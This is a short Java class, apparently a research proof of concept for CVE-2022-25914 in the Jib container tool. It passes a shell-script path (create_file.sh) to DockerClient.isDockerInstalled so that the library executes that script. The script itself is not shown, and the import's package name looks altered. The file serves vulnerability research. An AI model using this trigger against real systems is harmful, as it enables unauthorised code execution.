package com.anonuser;

import com.company.cloud.tools.jib.docker.DockerClient;

import java.nio.file.Path;
import java.nio.file.Paths;

public class Jib_CVE_2022_25914 {

    public static void main(String[] args) {

        Path path = Paths.get("/home/pamusuo/research/permissions-manager/exploit-apps/files/create_file.sh");
        DockerClient.isDockerInstalled(path);
    }
}
